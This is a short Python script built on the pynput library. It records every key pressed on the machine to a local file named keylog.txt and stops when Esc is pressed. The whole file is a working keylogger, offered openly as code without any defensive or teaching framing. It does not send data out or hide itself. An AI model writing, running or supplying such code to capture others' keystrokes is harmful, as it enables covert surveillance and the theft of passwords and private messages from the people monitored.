from pynput.keyboard import Key, Listener

# File to save logged keys
log_file = "keylog.txt"

# Function to log keys
def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Stop logging when 'Esc' is pressed
def on_release(key):
    if key == Key.esc:
        return False

# Start listening for keypresses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
